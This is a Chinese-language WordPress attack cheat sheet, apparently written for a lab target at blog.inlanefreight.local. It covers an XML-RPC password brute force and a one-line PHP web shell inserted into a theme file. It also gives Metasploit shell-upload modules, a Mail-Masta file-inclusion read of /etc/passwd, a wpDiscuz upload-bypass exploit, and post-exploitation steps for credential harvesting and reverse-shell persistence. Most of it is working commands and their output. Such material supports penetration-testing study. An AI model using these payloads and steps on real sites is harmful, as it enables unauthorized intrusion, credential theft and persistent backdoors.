# Wordpress

## <mark style="color:red;">**1. 發現點**</mark>

#### 1️⃣ 瀏覽 `robots.txt`

```bash
curl -s http://blog.inlanefreight.local/robots.txt
```

* 有時會列出隱藏路徑

#### 2️⃣ 確認 CMS

```bash
curl -s http://blog.inlanefreight.local | grep WordPress
```

* 出現 WordPress 5.8 即可確認

#### 3️⃣ 確認主題 & 插件

```bash
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://blog.inlanefreight.local/ | grep plugins
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
```

> 透過路徑 `/wp-content/themes/` 同 `/wp-content/plugins/` 可以知道網站用咩主題/插件。

## <mark style="color:red;">**2. 測試Payload**</mark>

#### 1️⃣ 使用 WPScan

```bash
sudo gem install wpscan
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <你的token>
```

* 列出用戶、主題、插件、版本、已知漏洞

#### 2️⃣ 用戶爆破（XML-RPC）

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

> 如果爆破成功例如：

```
Username: john
Password: firebird1
```

即可以用 admin 身份登入 `http://blog.inlanefreight.local/wp-login.php`。

## <mark style="color:red;">3.   後台取得 RCE</mark>

#### 方法 A：修改主題檔案取得 WebShell

1. 後台登入之後，去

```
外觀 > 主題檔案編輯器 (Appearance > Theme Editor)
```

2. 選一個主題（例如 `twentynineteen`），然後選 `404.php`
3. 在底部加入：

```php
<?php system($_GET[0]); ?>
```

4. 儲存並透過 cURL 測試：

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

* 出現 `uid=33(www-data)` 就成功！

***

#### 方法 B：Metasploit 模組自動上傳 shell

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost <你的IP>
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set vhost blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
```

> 成功就會開一個 meterpreter session。

<details>

<summary>Complete Version</summary>

#### PHP 外掛 <a href="#php-plugin" id="php-plugin"></a>

可能可以將.php 檔案上傳為外掛。使用以下範例建立你的 php 後門：

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2F1116388331-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-Mks5MA8MikNk7jIq3z3%252Fsync%252Fd16665578087eeeeabbc220c92bac5d7569bc787.png%3Fgeneration%3D1633028912917435%26alt%3Dmedia\&width=768\&dpr=4\&quality=100\&sign=630366d3\&sv=2)

然後新增一個插件：

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2F1116388331-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-Mks5MA8MikNk7jIq3z3%252Fsync%252F8668dea5b059b1fc486cb53cde1d8d65b849a027.png%3Fgeneration%3D1633028912328355%26alt%3Dmedia\&width=768\&dpr=4\&quality=100\&sign=15e35091\&sv=2)

上傳外掛程式並按立即安裝：

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2F1116388331-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-Mks5MA8MikNk7jIq3z3%252Fsync%252F12c26ff94b8d74da8199129602062d6b390dfae5.png%3Fgeneration%3D1633028913022059%26alt%3Dmedia\&width=768\&dpr=4\&quality=100\&sign=fbd18a8a\&sv=2)

點選“處理”：

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2F1116388331-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-Mks5MA8MikNk7jIq3z3%252Fsync%252Fa18257e302f3bae245bef01690197799da17fdb7.png%3Fgeneration%3D1633028912574951%26alt%3Dmedia\&width=768\&dpr=4\&quality=100\&sign=a7739fde\&sv=2)

顯然這可能不會產生任何效果，但如果你進入媒體，你會看到你的 shell 已上傳：

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2F1116388331-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-Mks5MA8MikNk7jIq3z3%252Fsync%252F5d706c741824ed569e0401c561099cb720ae1a49.png%3Fgeneration%3D1633028912942366%26alt%3Dmedia\&width=768\&dpr=4\&quality=100\&sign=44ea2982\&sv=2)

存取它，你會看到執行反向shell的URL：

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2F1116388331-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-Mks5MA8MikNk7jIq3z3%252Fsync%252F56a77483c7b7c56d4c76d92502ca78fb0a77667d.png%3Fgeneration%3D1633028913071184%26alt%3Dmedia\&width=768\&dpr=4\&quality=100\&sign=7425673b\&sv=2)

#### 上傳並啟用惡意插件 <a href="#uploading-and-activating-malicious-plugin" id="uploading-and-activating-malicious-plugin"></a>

**（此部分複製自** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)**）**

有時候登入使用者沒有可寫的權限來對WordPress主題進行修改，所以我們選擇「注入WP pulgin惡意程式碼」作為取得web shell的替代策略。

因此，一旦您可以存取 WordPress 儀表板，您就可以嘗試安裝惡意外掛程式。這裡我已經從exploit db下載了有漏洞的插件。

點擊[**此處**](https://www.exploit-db.com/exploits/36374) _\*\*_&#x4E0B;載插件進行練習。

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2Fi1.wp.com%2F1.bp.blogspot.com%2F-Y_Aw7zSFJZs%2FXY9pymSjdvI%2FAAAAAAAAguY%2FFGyGEzlx9VIqNYyyra9r55IklNmwXwMQwCLcBGAsYHQ%2Fs1600%2F10.png%3Fw%3D687%26ssl%3D1\&width=768\&dpr=4\&quality=100\&sign=ea5b39e0\&sv=2)

由於我們有插件的 zip 文件，現在是時候上傳插件了。

儀表板 > 插件 > 上傳插件

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2Fi0.wp.com%2F1.bp.blogspot.com%2F-FLhqB0I32Mg%2FXY9pyrlKWAI%2FAAAAAAAAguU%2FtofpIetTCv4Mho5y5D_sDuuokC7mDmKowCLcBGAsYHQ%2Fs1600%2F11.png%3Fw%3D687%26ssl%3D1\&width=768\&dpr=4\&quality=100\&sign=810c6551\&sv=2)

瀏覽下載的 zip 文件，如圖所示。

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2Fi2.wp.com%2F1.bp.blogspot.com%2F-KMumiwE2Tf0%2FXY9pzznEI4I%2FAAAAAAAAguk%2FBavBJP6plFo8NIpa38oWEKfx0jkOXv3HgCLcBGAsYHQ%2Fs1600%2F12.png%3Fw%3D687%26ssl%3D1\&width=768\&dpr=4\&quality=100\&sign=adaf0d97\&sv=2)

一旦包成功安裝，我們需要啟動插件。

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2Fi2.wp.com%2F1.bp.blogspot.com%2F-YrFg94Y2EZs%2FXY9pzydfLDI%2FAAAAAAAAgug%2FAjZyQ6Na8kUUmquJXwoapxcmr2-8nAMwQCLcBGAsYHQ%2Fs1600%2F13.png%3Fw%3D687%26ssl%3D1\&width=768\&dpr=4\&quality=100\&sign=8ffcb257\&sv=2)

當一切設定好之後就可以進行利用了。由於我們安裝了名為“reflex-gallery”的易受攻擊的插件，因此它很容易被利用。

您將在 Metasploit 框架內利用此漏洞，從而載入以下模組並執行以下命令：

1234

使用exploit/unix/webapp/wp\_slideshowgallery\_uploadset rhosts 192.168.1.101set targeturi /wordpressexploit

執行上述命令後，您將擁有 meterpreter 會話。如本文所述，有許多方法可以利用 WordPress 平台網站。

![](https://hacktricks.boitatech.com.br/~gitbook/image?url=https%3A%2F%2Fi1.wp.com%2F1.bp.blogspot.com%2F-s6Yblqj-zQ8%2FXY9pz0qYWAI%2FAAAAAAAAguo%2FWXgEBKIB64Ian_RQWaltbEtdzCNpexKOwCLcBGAsYHQ%2Fs1600%2F14.png%3Fw%3D687%26ssl%3D1\&width=768\&dpr=4\&quality=100\&sign=c08003dc\&sv=2)

</details>



## <mark style="color:red;">4. 已知漏洞利用</mark>



#### 1️⃣ Mail-Masta 插件 RFI（Remote File Inclusion）

* 測試：

```bash
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

* 如果成功顯示 `/etc/passwd`，代表存在 RFI，進一步可利用上傳本地 payload。

***

#### 2️⃣ wpDiscuz 文件上傳繞過（版本 <= 7.0.4）

* 利用腳本上傳 PHP webshell：

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

* 用 cURL 測試：

```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/<shell>.php?cmd=id
```

> 出現 `uid=33(www-data)`，即 RCE 成功。

## <mark style="color:red;">5.利用已知漏洞</mark>

**易受攻擊的插件 - mail-masta**

\


```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

我們可以看到， `pl`參數允許我們包含一個文件，而無需任何類型的輸入驗證或清理。利用這個，我們可以在網頁伺服器上包含任意檔案。讓我們利用這一點來使用`cURL`檢索`/etc/passwd`檔案的內容。

\


```shell-session
PikachuN@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
```

**易受攻擊的外掛 - wpDiscuz**

\
[wpDiscuz](https://wpdiscuz.com/)是一個 WordPress 插件，用於增強頁面貼文的評論功能。在撰寫本文時，該插件的[下載量已超過 160 萬次](https://wordpress.org/plugins/wpdiscuz/advanced/)，活躍安裝量超過 90,000 次，這使它成為我們很有可能在評估期間遇到的非常受歡迎的插件。根據版本號（7.0.4），此[漏洞](https://www.exploit-db.com/exploits/49967)很有可能讓我們獲得命令執行。該漏洞的關鍵是文件上傳繞過。 wpDiscuz 僅允許圖像附件。檔案 mime 類型功能可能會被繞過，從而允許未經身份驗證的攻擊者上傳惡意 PHP 檔案並獲得遠端程式碼執行。關於 MIME 類型偵測功能繞過的更多資訊可以[在這裡](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/)找到。

\


```shell-session
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

\
所寫的漏洞可能會失敗，但是我們可以使用`cURL`使用上傳的 Web shell 執行命令。我們只需要在`.php`副檔名後面附加`?cmd=`即可執行我們可以在漏洞腳本中看到的指令。

\


```shell-session
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## <mark style="color:red;">6. 連鎖漏洞</mark>

一旦取得 webshell / meterpreter session，可以進一步：

| 攻擊動作  | 方法                                             |
| ----- | ---------------------------------------------- |
| 提權    | `sudo -l` 檢查 sudo 權限、或找可寫 cron 任務              |
| 密碼收集  | 檢查 `wp-config.php` 抓取資料庫帳密                     |
| 內網掃描  | `netstat -anp` 或 `nmap -sP 內部段`                |
| 橫向移動  | 試用相同帳密登入其他服務                                   |
| 持久化後門 | 在 `/wp-content/uploads` 或 `/themes` 留下反向 shell |
